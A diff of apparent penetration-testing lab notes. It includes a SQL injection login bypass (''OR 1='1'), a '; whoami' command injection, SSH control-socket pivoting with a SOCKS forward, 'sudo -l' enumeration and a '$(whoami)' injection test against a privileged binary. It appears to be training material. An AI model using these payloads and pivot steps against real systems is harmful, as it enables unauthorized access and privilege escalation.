@@ -53,13 +53,41 @@ http://ip/login.php?**username='OR 1='1&passwd='OR 1='1**
 
 **; whoami**
 
-(note: if so you can run a .ssh keygen and try to exploit machine that way)
+(note: if so you can run a .ssh keygen and try to exploit machine that way **look at WebExploit notes**)
 
 # Moving into exploiting machine 
 
 - (ip you were given, make a MS and enter creds)
 
 **ssh -MS /tmp/pivot user@ip**
+
+(note: from the box try running cmd **bash** to have a better term)
+
+- (from linops)
+
+(make pivot dynamic to enumerate)
+
+**ssh -S /tmp/pivot pivot -O forward -D 9050**
+
+- (from pivot box)
+
+**sudo -l** : see escalated privs
+
+(note: in this case it gave **/var/tmp/exploit_me**, so I went to the dir and executed the exploit_me to see what it does)
+
+- (can do static analysis)
+
+**strings (exe)**
+
+- (the exe executed)
+
+**./exploit_me (stuffgoeshere)**
+
+- (so try entering some things)
+
+ex: **./exploit_me $(whoami)**
+
+- ( you know that it is a script that is a potential exploit on a machine so you will do the linuxexploitation on script)
 
 
 
